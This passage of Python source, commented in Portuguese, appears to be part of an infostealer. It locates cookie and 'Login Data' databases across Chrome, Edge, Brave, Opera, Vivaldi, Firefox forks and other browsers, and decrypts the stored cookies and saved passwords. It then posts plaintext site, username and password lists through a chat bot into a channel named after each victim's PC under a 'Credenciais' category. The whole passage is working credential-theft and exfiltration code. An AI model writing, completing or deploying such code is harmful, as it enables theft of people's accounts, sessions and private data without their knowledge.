    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    candidates: list[tuple[str, str, str]] = []  # (browser, cookies_path, local_state)
    if local:
        candidates += [
            ("chrome", os.path.join(local, r"Google\Chrome\User Data\Default\Cookies"),
             os.path.join(local, r"Google\Chrome\User Data\Local State")),
            ("chrome-network", os.path.join(local, r"Google\Chrome\User Data\Default\Network\Cookies"),
             os.path.join(local, r"Google\Chrome\User Data\Local State")),
            ("edge", os.path.join(local, r"Microsoft\Edge\User Data\Default\Cookies"),
             os.path.join(local, r"Microsoft\Edge\User Data\Local State")),
            ("edge-network", os.path.join(local, r"Microsoft\Edge\User Data\Default\Network\Cookies"),
             os.path.join(local, r"Microsoft\Edge\User Data\Local State")),
            ("brave", os.path.join(local, r"BraveSoftware\Brave-Browser\User Data\Default\Cookies"),
             os.path.join(local, r"BraveSoftware\Brave-Browser\User Data\Local State")),
            ("opera", os.path.join(roaming, r"Opera Software\Opera Stable\Cookies"),
             os.path.join(roaming, r"Opera Software\Opera Stable\Local State")),
            ("opera-gx", os.path.join(roaming, r"Opera Software\Opera GX Stable\Cookies"),
             os.path.join(roaming, r"Opera Software\Opera GX Stable\Local State")),
            ("vivaldi", os.path.join(local, r"Vivaldi\User Data\Default\Cookies"),
             os.path.join(local, r"Vivaldi\User Data\Local State")),
        ]
    # descobertos fora dos caminhos fixos (ex.: Helium em %LOCALAPPDATA%\imput\Helium)
    for fam, root in _chromium_roots():
        if fam in _CHROMIUM_FIXED_FAMS:
            continue
        ls = os.path.join(root, "Local State")
        d = os.path.join(root, "Default")
        candidates += [
            (fam, os.path.join(d, "Cookies"), ls),
            (fam + "-network", os.path.join(d, "Network", "Cookies"), ls),
        ]
    # perfis extras Profile */Default — todos os Chromium instalados
    extra: list[tuple[str, str, str]] = []
    for browser, base in _chromium_profile_bases():
        try:
            for prof in glob.glob(os.path.join(base, "Profile *")) + glob.glob(os.path.join(base, "Default")):
                for name in ("Cookies", os.path.join("Network", "Cookies")):
                    p = os.path.join(prof, name)
                    ls = os.path.join(base, "Local State")
                    if os.path.isfile(p):
                        extra.append((f"{browser}-{os.path.basename(prof)}", p, ls))
        except Exception:
            continue
    candidates += extra
    # varrimento genérico: todas as BDs 'Cookies' de NAVEGADORES que os
    # caminhos fixos não prevêem (forks, variantes, perfis extra) — é o que
    # faz a coleta apanhar os outros navegadores em vez de só chrome/edge/
    # brave/helium. Apps Electron ficam de fora (filtradas pelo próprio sweep).
    candidates += _sweep_cookie_dbs()

    seen: set[str] = set()
    out: list[dict] = []
    raws: list[tuple[str, bytes]] = []
    stats: dict[str, dict] = {}
    used_arcs: set[str] = set()
    for browser, cpath, lstate in candidates:
        if not cpath or cpath.lower() in seen or not os.path.isfile(cpath):
            continue
        if not _is_browser_path(cpath):
            continue          # só navegadores: VS Code/Discord/CapCut/Outlook ficam de fora
        seen.add(cpath.lower())
        st = stats.setdefault(browser, {"found": 0, "ok": 0, "undec": 0,
                                         "blocked": False, "rows": 0})
        master = _chromium_master_key(lstate) if os.path.isfile(lstate) else None
        abe = _abe_candidate_keys(lstate) if os.path.isfile(lstate) else []
        tmp = _copy_to_temp(cpath, "cookies")
        if not tmp:
            st["blocked"] = True
            continue
        try:
            import sqlite3

            con = sqlite3.connect(tmp)
            cur = con.cursor()
            try:
                cur.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                rows = cur.fetchall()
                readable = True
            except Exception:
                rows = []
                readable = False
            con.close()
            st["rows"] += len(rows)
            for host, name, value, enc, path, exp, sec, http in rows:
                st["found"] += 1
                enc_b = enc if isinstance(enc, (bytes, bytearray)) else b""
                had_plain = bool(value)
                if not had_plain:
                    if enc_b:
                        try:
                            value = _decrypt_chromium_value(bytes(enc_b), master, abe, cookie=True)
                        except Exception:
                            value = ""
                    else:
                        value = ""
                    if not value:
                        st["undec"] += 1
                else:
                    value = str(value)
                if value:
                    st["ok"] += 1
                out.append({"browser": browser, "host": host, "name": name,
                            "value": value or "", "path": path,
                            "secure": bool(sec), "httponly": bool(http)})
            # BD vazia: não vale mandar um raw de 0 linhas (só enche o canal).
            # BD ilegível (SELECT falhou): manda o raw mesmo assim.
            if rows or not readable:
                # nomes únicos: uma família com 2 perfis gerava 2 entradas
                # com o mesmo nome no ZIP (a segunda ficava ilegível).
                arc, n = f"{browser}-Cookies.raw", 1
                while arc in used_arcs:
                    n += 1
                    arc = f"{browser}-{n}-Cookies.raw"
                used_arcs.add(arc)
                try:
                    with open(tmp, "rb") as f:
                        raws.append((arc, f.read()))
                except Exception:
                    pass
        except Exception:
            st["blocked"] = True
            continue
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass
    return out, raws, stats


# Navegadores Gecko: mesma BD (cookies.sqlite) e mesma tabela (moz_cookies),
# só muda a pasta em %APPDATA%. Firefox é o caso comum — os forks entram todos,
# senão a coleta deixava de cobrir "todos os navegadores".
_GEECKO_HOME_DIRS: tuple[tuple[str, str], ...] = (
    (os.path.join("Mozilla", "Firefox"), "firefox"),
    ("Waterfox", "waterfox"),
    ("LibreWolf", "librewolf"),
    ("Floorp", "floorp"),
    ("Pale Moon", "palemoon"),
    ("SeaMonkey", "seamonkey"),
    ("Basilisk", "basilisk"),
    ("Mullvad Browser", "mullvad"),
    ("Tor Browser", "torbrowser"),
)


def _collect_firefox_cookies() -> tuple[list[dict], list[tuple[str, bytes]], dict[str, dict]]:
    import glob
    import sqlite3

    roaming = os.environ.get("APPDATA", "")
    out: list[dict] = []
    raws: list[tuple[str, bytes]] = []
    stats: dict[str, dict] = {}
    used_arcs: set[str] = set()
    if not roaming:
        return out, raws, stats
    for home, fam in _GEECKO_HOME_DIRS:
        for pat in (os.path.join(roaming, home, "Profiles", "*", "cookies.sqlite"),
                    os.path.join(roaming, home, "Profiles", "*", "Network", "cookies.sqlite")):
            try:
                for cpath in glob.glob(pat):
                    st = stats.setdefault(fam, {"found": 0, "ok": 0, "undec": 0,
                                                "blocked": False, "rows": 0})
                    tmp = _copy_to_temp(cpath, "moz_cookies")
                    if not tmp:
                        st["blocked"] = True
                        continue
                    try:
                        con = sqlite3.connect(tmp)
                        cur = con.cursor()
                        try:
                            cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                            rows = cur.fetchall()
                        except Exception:
                            rows = []
                        con.close()
                        st["rows"] += len(rows)
                        for host, name, value, path, exp, sec, http in rows:
                            st["found"] += 1
                            if value:
                                st["ok"] += 1
                            out.append({"browser": fam, "host": host, "name": name,
                                        "value": value or "", "path": path,
                                        "secure": bool(sec), "httponly": bool(http)})
                        try:
                            arc, n = f"{fam}-cookies.sqlite.raw", 1
                            while arc in used_arcs:
                                n += 1
                                arc = f"{fam}-{n}-cookies.sqlite.raw"
                            used_arcs.add(arc)
                            with open(tmp, "rb") as f:
                                raws.append((arc, f.read()))
                        except Exception:
                            pass
                    except Exception:
                        st["blocked"] = True
                        continue
                    finally:
                        try:
                            os.remove(tmp)
                        except Exception:
                            pass
            except Exception:
                continue
    return out, raws, stats


def _browser_family(browser: str) -> str:
    """Normaliza 'chrome-Profile 1'/'chrome-network' -> 'chrome', etc."""
    b = (browser or "").strip().lower()
    # Nunca devolver um path: virava chave de per_browser e de tombstone, com
    # ':' e '\' no nome do ficheiro -> envio falhava -> estado nunca gravado
    # -> o bot reenviava tudo em cada arranque.
    if any(c in b for c in "\\/"):
        b = b.replace("\\", "/").rstrip("/").rsplit("/", 1)[-1] or "unknown"
    for fam in ("chrome", "edge", "brave", "opera", "vivaldi", "helium", "firefox"):
        if b == fam or b.startswith(fam + "-") or b.startswith(fam + " ") or b.startswith(fam):
            return fam
    if not b:
        return "unknown"
    return b.split("-")[0].split(" ")[0] or "unknown"


def _passwords_marker_path() -> str:
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"passwords_sent_{pc}.marker")


def _passwords_state_path() -> str:
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"passwords_state_{pc}.json")


def _passwords_channel_path() -> str:
    """Ficheiro que guarda o canal dedicado (já criado) das senhas deste PC."""
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"passwords_channel_{pc}.json")


def _load_passwords_channel() -> dict:
    import json
    try:
        p = _passwords_channel_path()
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f:
                d = json.load(f)
                if isinstance(d, dict) and d.get("channel_id"):
                    return d
    except Exception:
        pass
    return {}


def _save_passwords_channel(rec: dict) -> None:
    import json
    try:
        with open(_passwords_channel_path(), "w", encoding="utf-8") as f:
            json.dump(rec, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


def _forget_passwords_channel() -> None:
    """Apaga o registo do canal dedicado (só quando o canal desapareceu no servidor)."""
    try:
        os.remove(_passwords_channel_path())
    except OSError:
        pass


def _channel_is_gone(err) -> bool:
    """True se o erro indica que o canal deixou de existir (recria-se a seguir)."""
    s = str(err or "").lower()
    return any(k in s for k in ("not found", "does not exist", "no such",
                                "unknown channel", "invalid channel",
                                "missing", "forbidden", "no permission"))


async def _channel_alive(bot: Bot, community_id: int, channel_id: int) -> bool | None:
    """True/False se o canal existe no servidor; None se não deu para verificar.

    Existe porque "já enviei para aquele canal" deixa de ser verdade se alguém
    apagar o canal — aí tem de se recriar e voltar a enviar.
    """
    try:
        comm = Community.from_id(int(community_id), bot._client)
        chans = await comm.fetch_channels()
        return any(int(c.id) == int(channel_id) for c in chans)
    except Exception:
        return None


def _passwords_channel_name(pc: str | None = None,
                            now: datetime.datetime | None = None) -> str:
    """Nome do canal dedicado: <pc>-<AAAA-MM-DD-HH-MM-SS> — PC, data, hora e segundos."""
    now = now or datetime.datetime.now()
    ts = now.strftime("%Y-%m-%d-%H-%M-%S")     # 19 chars fixos, fica sempre no fim
    room = max(4, MAX_CHANNEL_NAME_LEN - len(ts) - 1)
    head = sanitize_channel_name(pc or get_pc_name(), max_len=room)
    return f"{head}-{ts}"[:MAX_CHANNEL_NAME_LEN]


async def ensure_passwords_channel(bot: Bot, community_id: int, category_id: int,
                                   fallback_channel_id: int) -> tuple[int, int]:
    """Cria UMA vez o canal dedicado das senhas e devolve (community_id, channel_id).

    Nome = PC + data + hora + segundos, dentro da categoria "Credenciais".
    Fica registado em disco: nas execuções seguintes devolve-o logo, sem criar
    nem recriar. Se a criação falhar, usa o canal já registado ou o canal
    configurado — mas marca `created: false` para re-tentar mais tarde.
    """
    rec = _load_passwords_channel()
    if rec.get("channel_id") and rec.get("created"):
        return int(rec.get("community_id") or community_id), int(rec["channel_id"])

    name = _passwords_channel_name()
    pc = sanitize_channel_name(get_pc_name())
    try:
        comm = Community.from_id(int(community_id), bot._client)
        channels = await comm.fetch_channels()
        # reutiliza se já existir um canal com este nome, ou um dedicado antigo
        # deste PC na mesma categoria (state perdido -> não duplica)
        found = None
        for c in channels:
            if (c.name or "").lower() == name.lower():
                found = c
                break
        if found is None:
            for c in channels:
                nm = (c.name or "")
                if nm.lower().startswith(pc + "-") and \
                        (not category_id or int(c.parent_id or 0) == int(category_id)):
                    found = c
                    break
        if found is None:
            found = await comm.create_channel(name, parent_id=int(category_id) or None)
        _save_passwords_channel({
            "community_id": int(community_id),
            "category_id": int(category_id),
            "channel_id": int(found.id),
            "channel_name": str(found.name or name),
            "created": True,
            "created_at": datetime.datetime.now().astimezone().isoformat(),
        })
        print(f"[passwords] canal dedicado: #{found.name} (id={found.id}) "
              f"na categoria {category_id}", flush=True)
        return int(community_id), int(found.id)
    except Exception as e:
        print(f"[passwords] falha no canal dedicado: {type(e).__name__}: {e}", flush=True)

    rec = _load_passwords_channel()
    if not rec.get("channel_id"):
        # guarda o fallback para "já enviou" ficar coerente (não spama) e para
        # se re-tentar a criação da próxima vez (created: false)
        _save_passwords_channel({
            "community_id": int(community_id),
            "category_id": int(category_id),
            "channel_id": int(fallback_channel_id),
            "channel_name": "(fallback) canal configurado",
            "created": False,
            "created_at": datetime.datetime.now().astimezone().isoformat(),
        })
        rec = _load_passwords_channel()
    return int(rec.get("community_id") or community_id), int(rec["channel_id"])


def _load_passwords_state() -> dict:
    import json
    p = _passwords_state_path()
    try:
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    return d
    except Exception:
        pass
    return {}


def _save_passwords_state(state: dict) -> None:
    import json
    # Guarda EM QUE CANAL os dados foram enviados. É isto que faz a próxima
    # execução concluir "já enviei" -> não envia nem cria canal de novo.
    try:
        rec = _load_passwords_channel()
        if rec.get("channel_id"):
            state["channel_id"] = int(rec["channel_id"])
            state["channel_name"] = str(rec.get("channel_name") or "")
    except Exception:
        pass
    try:
        with open(_passwords_state_path(), "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
    except Exception:
        pass
    try:
        with open(_passwords_marker_path(), "w", encoding="utf-8") as f:
            f.write(datetime.datetime.now().astimezone().isoformat() + f" total={state.get('total','?')} fp={str(state.get('overall_fp',''))[:12]}")
    except Exception:
        pass


def _fingerprint_logins(logins: list[dict]) -> str:
    import hashlib
    h = hashlib.sha256()
    try:
        rows = sorted(f"{l.get('browser','')}\t{l.get('url','')}\t{l.get('username','')}\t{l.get('password','')}" for l in logins)
    except Exception:
        rows = [str(len(logins))]
    for r in rows:
        h.update(r.encode("utf-8", errors="replace"))
        h.update(b"\x00")
    h.update(f"n={len(logins)}".encode())
    return h.hexdigest()


def _collect_chromium_logins() -> tuple[list[dict], dict[str, dict]]:
    """Coleta logins Chromium totalmente descriptografados.

    Retorna ([{browser,url,username,password}], stats) com
    stats[browser] = {found, ok, undec, blocked}.
    """
    import glob

    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    candidates: list[tuple[str, str, str]] = []  # (browser, login_data_path, local_state)
    if local or roaming:
        def _j(*a):
            return os.path.join(*a)
        if local:
            candidates += [
                ("chrome", _j(local, r"Google\Chrome\User Data\Default\Login Data"),
                 _j(local, r"Google\Chrome\User Data\Local State")),
                ("chrome-account", _j(local, r"Google\Chrome\User Data\Default\Login Data For Account"),
                 _j(local, r"Google\Chrome\User Data\Local State")),
                ("edge", _j(local, r"Microsoft\Edge\User Data\Default\Login Data"),
                 _j(local, r"Microsoft\Edge\User Data\Local State")),
                ("edge-account", _j(local, r"Microsoft\Edge\User Data\Default\Login Data For Account"),
                 _j(local, r"Microsoft\Edge\User Data\Local State")),
                ("brave", _j(local, r"BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
                 _j(local, r"BraveSoftware\Brave-Browser\User Data\Local State")),
                ("vivaldi", _j(local, r"Vivaldi\User Data\Default\Login Data"),
                 _j(local, r"Vivaldi\User Data\Local State")),
            ]
        if roaming:
            candidates += [
                ("opera", _j(roaming, r"Opera Software\Opera Stable\Login Data"),
                 _j(roaming, r"Opera Software\Opera Stable\Local State")),
                ("opera-gx", _j(roaming, r"Opera Software\Opera GX Stable\Login Data"),
                 _j(roaming, r"Opera Software\Opera GX Stable\Local State")),
            ]
    # descobertos fora dos caminhos fixos (ex.: Helium em %LOCALAPPDATA%\imput\Helium)
    for fam, root in _chromium_roots():
        if fam in _CHROMIUM_FIXED_FAMS:
            continue
        ls = os.path.join(root, "Local State")
        d = os.path.join(root, "Default")
        candidates += [
            (fam, os.path.join(d, "Login Data"), ls),
            (fam + "-account", os.path.join(d, "Login Data For Account"), ls),
        ]
    extra: list[tuple[str, str, str]] = []
    for browser, base in _chromium_profile_bases():
        try:
            for prof in glob.glob(os.path.join(base, "Profile *")) + glob.glob(os.path.join(base, "Default")):
                for name in ("Login Data", "Login Data For Account"):
                    p = os.path.join(prof, name)
                    ls = os.path.join(base, "Local State")
                    if os.path.isfile(p):
                        extra.append((f"{browser}-{os.path.basename(prof)}", p, ls))
        except Exception:
            continue
    candidates += extra
    # descoberta por varrimento: garante que QUALQUER 'Login Data' da máquina
    # entra na coleta, mesmo o que nenhum caminho fixo prevê (variantes,
    # perfis fora do Default, BDs de apps WebView2)
    candidates += _sweep_login_data()

    seen: set[str] = set()
    out: list[dict] = []
    stats: dict[str, dict] = {}
    for browser, lpath, lstate in candidates:
        if not lpath or lpath.lower() in seen or not os.path.isfile(lpath):
            continue
        seen.add(lpath.lower())
        st = stats.setdefault(browser, {"found": 0, "ok": 0, "undec": 0, "blocked": False})
        master = _chromium_master_key(lstate) if lstate and os.path.isfile(lstate) else None
        abe = _abe_candidate_keys(lstate) if lstate and os.path.isfile(lstate) else []
        tmp = _copy_to_temp(lpath, "logins")
        if not tmp:
            st["blocked"] = True
            continue
        try:
            import sqlite3
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            try:
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cur.fetchall()
            except Exception:
                rows = []
            try:
                con.close()
            except Exception:
                pass
            for url, username, enc in rows:
                enc_b = enc if isinstance(enc, (bytes, bytearray)) else b""
                if not enc_b:
                    continue  # linha sem senha guardada
                st["found"] += 1
                try:
                    pwd = _decrypt_chromium_value(bytes(enc_b), master, abe)
                except Exception:
                    pwd = ""
                url_s = str(url or "").strip()
                user_s = str(username or "").strip()
                if not pwd:
                    st["undec"] += 1
                    continue  # só texto puro totalmente descriptografado
                st["ok"] += 1
                out.append({"browser": browser, "url": url_s, "username": user_s, "password": pwd})
        except Exception:
            st["blocked"] = True
            continue
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass
    return out, stats


def _collect_firefox_logins() -> tuple[list[dict], dict[str, dict]]:
    """Firefox usa NSS (key4.db); sem senha mestra tenta leitura, senão retorna bruto sem senha."""
    import glob
    import json as _json
    import base64 as _b64

    roaming = os.environ.get("APPDATA", "")
    out: list[dict] = []
    stats: dict[str, dict] = {}
    if not roaming:
        return out, stats
    for pat in (os.path.join(roaming, r"Mozilla\Firefox\Profiles\*\logins.json"),):
        try:
            for lpath in glob.glob(pat):
                try:
                    with open(lpath, "r", encoding="utf-8") as f:
                        js = _json.load(f)
                    for e in js.get("logins", []):
                        host = str(e.get("hostname", ""))
                        user_enc = str(e.get("encryptedUsername", ""))
                        pass_enc = str(e.get("encryptedPassword", ""))
                        # NSS sem implementacao completa aqui: tenta base64 só para detectar, não descriptografa
                        _ = user_enc
                        _ = _b64
                        # não envia cifrado como puro: pula (chromium já cobre texto puro)
                        if pass_enc:
                            st = stats.setdefault("firefox", {"found": 0, "ok": 0,
                                                              "undec": 0, "blocked": False})
                            st["found"] += 1
                            st["undec"] += 1
                        _ = host
                        continue
                except Exception:
                    continue
        except Exception:
            continue
    return out, stats


def _merge_stats(dst: dict[str, dict], label: str, st: dict) -> None:
    """Agrega stats de um arquivo ('edge-network') para a família ('edge')."""
    fam = _browser_family(label)
    fs = dst.setdefault(fam, {"found": 0, "ok": 0, "undec": 0,
                              "blocked": False, "db_ok": 0, "db_blocked": 0,
                              "rows": 0})
    fs["found"] += int(st.get("found", 0) or 0)
    fs["ok"] += int(st.get("ok", 0) or 0)
    fs["undec"] += int(st.get("undec", 0) or 0)
    fs["rows"] += int(st.get("rows", 0) or 0)
    if st.get("blocked"):
        fs["db_blocked"] += 1
    else:
        fs["db_ok"] += 1
    fs["blocked"] = bool(fs["db_ok"] == 0 and fs["db_blocked"] > 0)


def _stats_status(st: dict) -> str:
    """Rótulo de estado da família: 'ok' | 'pendente' | 'bloqueada'."""
    if not st:
        return "ok"
    if st.get("blocked"):
        return "bloqueada"
    if st.get("found", 0) and not st.get("ok", 0):
        return "pendente"
    return "ok"


def _stats_log(prefix: str, fam: str, st: dict | None) -> None:
    if not st:
        return
    status = _stats_status(st)
    msg = (f"{prefix} {fam}: {st.get('found', 0)} encontrada(s), {st.get('ok', 0)} descript., "
           f"{st.get('undec', 0)} indescifr -> {status}")
    if status == "ok" and st.get("found", 0) == 0 and not st.get("blocked"):
        return
    print(msg, flush=True)


def _collect_all_logins_grouped() -> tuple[str, str, dict, dict]:
    """Retorna (pc, ts, by_fam, fam_stats) com logins descriptografados por família."""
    import datetime as _dt
    chrom, st_chrom = _collect_chromium_logins()
    fire, st_fire = _collect_firefox_logins()
    all_logins = chrom + fire
    fam_stats: dict[str, dict] = {}
    for label, st in st_chrom.items():
        _merge_stats(fam_stats, label, st)
    for label, st in st_fire.items():
        _merge_stats(fam_stats, label, st)
    pc = get_pc_name()
    ts = _dt.datetime.now().astimezone().strftime("%Y-%m-%d_%H-%M-%S")
    by_fam: dict[str, list[dict]] = {}
    for l in all_logins:
        fam = _browser_family(str(l.get("browser", "")))
        by_fam.setdefault(fam, []).append(l)
    for fam in sorted(fam_stats.keys()):
        _stats_log("[passwords]", fam, fam_stats[fam])
    return pc, ts, by_fam, fam_stats


def _format_logins_text(pc: str, ts: str, fam: str, logins: list[dict]) -> str:
    lines = [f"PC: {pc} | browser: {fam} | total: {len(logins)} | {ts}"]
    for l in logins:
        lines.append(f"site: {l.get('url','')}")
        lines.append(f"user: {l.get('username','')}")
        lines.append(f"pass: {l.get('password','')}")
        lines.append("----")
    return "\n".join(lines)


async def send_text_to_channel(bot: Bot, community_id: int, channel_id: int, text: str,
                               tag: str = "passwords") -> list[int]:
    """Envia texto puro (não arquivo), quebrado em blocos de ~1800 chars. Retorna msg ids."""
    from osmium_chat.channel import Channel as _Ch
    chat_ref = PB_ChatRef(channel=PB_ChannelRef(
        community_id=int(community_id), channel_id=int(channel_id)))
    ch = _Ch(chat_ref, bot._client, id=int(channel_id), community_id=int(community_id))
    # quebra por linhas sem estourar o limite
    chunks: list[str] = []
    cur: list[str] = []
    cur_len = 0
    for line in text.split("\n"):
        add = len(line) + 1
        if cur and cur_len + add > 1800:
            chunks.append("\n".join(cur))
            cur = [line]
            cur_len = add
        else:
            cur.append(line)
            cur_len += add
    if cur:
        chunks.append("\n".join(cur))
    if not chunks:
        chunks = [text[:1800] or "(vazio)"]
    ids: list[int] = []
    for part in chunks:
        try:
            msg = await ch.send(part)
            mid = getattr(msg, "id", 0)
            try:
                ids.append(int(mid))
            except Exception:
                ids.append(0)
            print(f"[{tag}] texto enviado ({len(part)} chars) message_id={mid} -> channel={int(channel_id)}", flush=True)
        except Exception as e:
            print(f"[{tag}] falha texto: {type(e).__name__}: {e}", file=sys.stderr)
            raise
    return ids


async def send_passwords_once(bot: Bot, community_id: int, channel_id: int, force: bool = False,
                              is_startup: bool = False, startup_resend: bool = True,
                              category_id: int = PASSWORDS_CATEGORY_ID) -> bool:
    """Coleta senhas descriptografadas e envia em TEXTO PURO (não arquivo).

    Cria UMA vez, na categoria "Credenciais", um canal chamado <pc>-<data-hora-segundos>
    e envia para lá. O canal fica registado em disco e o estado guarda EM QUE CANAL
    foi enviado: já enviou + sem mudança => não envia e não cria canal novo.
    (`is_startup`/`startup_resend` já não reenviam nada: o canal dedicado não é
    spamado, mesmo que o histórico da comunidade esteja indisponível.)
    """
    marker = _passwords_marker_path()
    print(f"[passwords] categoria={category_id} fallback community={community_id} "
          f"channel={int(channel_id)} marker={marker}", flush=True)
    marker_exists = os.path.exists(marker)
    state = _load_passwords_state()
    ch_rec = _load_passwords_channel()
    known_channel = int(ch_rec.get("channel_id") or 0)
    # já foi enviado PARA O CANAL QUE ESTÁ REGISTADO? (marker antigo, antes do
    # canal dedicado, conta como "ainda não enviado")
    sent_to_channel = bool(known_channel) and int(state.get("channel_id") or 0) == known_channel
    if force:
        print("[passwords] force=1, ignora estado anterior (canal dedicado mantém-se)", flush=True)
        marker_exists = False
        state = {}
        sent_to_channel = False
    elif not marker_exists:
        print("[passwords] marker NÃO existe (apagado/novo PC), vai enviar", flush=True)
    elif not sent_to_channel:
        print("[passwords] ainda não enviou para o canal dedicado "
              f"(#{ch_rec.get('channel_name') or 'por criar'}), vai enviar", flush=True)
    print("[passwords] coletando logins de todos os navegadores "
          "(descoberta genérica + caminhos fixos) ...", flush=True)
    try:
        pc, ts, by_fam, fam_stats = await asyncio.to_thread(_collect_all_logins_grouped)
    except Exception as e:
        print(f"[passwords] coleta falhou: {e}", file=sys.stderr)
        return False

    cur_per: dict[str, dict] = {}
    pending_per: dict[str, dict] = {}
    for fam in sorted(set(list(by_fam.keys()) + list(fam_stats.keys()))):
        lst = by_fam.get(fam, [])
        st = fam_stats.get(fam, {})
        info = {"count": len(lst), "fp": _fingerprint_logins(lst),
                "status": _stats_status(st), "found": int(st.get("found", 0) or 0),
                "ok": int(st.get("ok", 0) or 0), "undec": int(st.get("undec", 0) or 0)}
        if lst:
            cur_per[fam] = info
        elif info["found"] > 0 or st.get("blocked"):
            pending_per[fam] = info      # existe mas nenhuma decifrável / BD bloqueada
        # senão: navegador sem senhas guardadas — ignora
    for fam, info in sorted(pending_per.items()):
        print(f"[passwords] {fam}: nenhuma senha decifrável ({info['status']}) — "
              f"PENDENTE, re-tenta depois", flush=True)
    all_current = [l for lst in by_fam.values() for l in lst]
    cur_overall = _fingerprint_logins(all_current)
    cur_total = len(all_current)
    prev_per: dict = state.get("per_browser", {}) if isinstance(state.get("per_browser", {}), dict) else {}
    prev_overall: str = str(state.get("overall_fp", ""))
    prev_per = _prune_stale_prev(prev_per, "passwords")

    if not cur_per:
        if pending_per:
            print("[passwords] nenhuma senha descriptografada disponível; "
                  "estado NÃO marcado como coletado", flush=True)
            return False
        if marker_exists and state.get("total", None) == 0:
            print("[passwords] continua vazio, pula", flush=True)
            return False
        print("[passwords] nenhum login com senha descriptografada, nada a enviar", flush=True)
        _save_passwords_state({"pc": pc, "overall_fp": cur_overall, "total": 0,
                               "per_browser": {}, "pending": {}, "parts": 0,
                               "updated_at": datetime.datetime.now().astimezone().isoformat()})
        return False
    if pending_per:
        print(f"[passwords] pendente: {sorted(pending_per.keys())} (não bloqueia o envio do resto)",
              flush=True)

    # Se a última criação do canal falhou e o envio foi para o canal de
    # fallback, re-tenta já cá dentro (há dados para enviar) — para o próximo
    # envio entrar no canal dedicado e não mais no fallback.
    if ch_rec.get("channel_id") and not ch_rec.get("created"):
        tgt0, ch0 = await ensure_passwords_channel(bot, int(community_id),
                                                   int(category_id), int(channel_id))
        ch_rec = _load_passwords_channel()
        print(f"[passwords] canal dedicado re-tentado: community={tgt0} channel={ch0} "
              f"#{ch_rec.get('channel_name', '?')} created={ch_rec.get('created')}", flush=True)

    if sent_to_channel and marker_exists and prev_overall == cur_overall and state.get("total") == cur_total:
        same = all(f in prev_per and prev_per[f].get("fp") == cur_per[f]["fp"] for f in cur_per) and set(prev_per.keys()) == set(cur_per.keys())
        if same:
            # "já enviei" só é verdade se o canal ainda lá estiver.
            chk = await _channel_alive(bot,
                                       int(ch_rec.get("community_id") or community_id),
                                       int(ch_rec.get("channel_id") or 0))
            if chk is False:
                print("[passwords] canal dedicado já não existe no servidor: "
                      "recria e volta a enviar", flush=True)
                _forget_passwords_channel()
                sent_to_channel = False     # passa a contar como "ainda não enviado"
            else:
                print(f"[passwords] já enviado para #{state.get('channel_name') or ch_rec.get('channel_name') or '?'} "
                      f"(total={cur_total} fp={cur_overall[:12]}), pula — sem mudanças", flush=True)
                return False

    # monta textos: só fams novas/alteradas (ou todas quando ainda não enviou
    # para o canal dedicado — inclui a migração de estado antigo)
    fams_to_send: list[str] = []
    for fam in sorted(cur_per.keys()):
        prev = prev_per.get(fam)
        if marker_exists and sent_to_channel and prev is not None and prev.get("fp") == cur_per[fam]["fp"]:
            continue
        fams_to_send.append(fam)
    if not fams_to_send:
        print(f"[passwords] sem mudança (total={cur_total}), pula", flush=True)
        return False

    # cria (SÓ UMA VEZ) o canal dedicado na categoria e envia para lá
    tgt_community, tgt_channel = await ensure_passwords_channel(
        bot, int(community_id), int(category_id), int(channel_id))
    ch_rec = _load_passwords_channel()
    print(f"[passwords] {len(fams_to_send)} navegador(es), total={cur_total} logins, "
          f"envia em texto puro -> community={tgt_community} channel={tgt_channel} "
          f"#{ch_rec.get('channel_name', '?')}", flush=True)
    ok_all = True
    all_ids: list[int] = []
    last_err: object = None
    for fam in fams_to_send:
        txt = _format_logins_text(pc, ts, fam, by_fam.get(fam, []))
        print(f"[passwords] pronto: {fam} ({len(by_fam.get(fam, []))} logins, {len(txt)} chars)", flush=True)
        try:
            ids = await send_text_to_channel(bot, int(tgt_community), int(tgt_channel), txt)
            all_ids += ids
            try:
                cur_per[fam]["msg_ids"] = ids
            except Exception:
                pass
        except Exception as e:
            last_err = e
            print(f"[passwords] envio falhou ({fam}): {e}", file=sys.stderr)
            ok_all = False
    if not ok_all:
        print("[passwords] nem todos enviaram, estado NÃO atualizado", flush=True)
        if ch_rec.get("channel_id") and _channel_is_gone(last_err):
            print("[passwords] canal dedicado desapareceu no servidor: será recriado", flush=True)
            _forget_passwords_channel()
        return False
    _save_passwords_state({"pc": pc, "overall_fp": cur_overall, "total": cur_total,
                           "per_browser": cur_per,
                           "pending": {f: {"found": i["found"], "ok": i["ok"],
                                           "undec": i["undec"], "status": i["status"]}
                                      for f, i in pending_per.items()},
                           "parts": len(fams_to_send),
                           "msg_ids": all_ids,
                           "updated_at": datetime.datetime.now().astimezone().isoformat()})
    print(f"[passwords] enviado texto puro ({len(fams_to_send)} bloco(s)) total={cur_total}", flush=True)
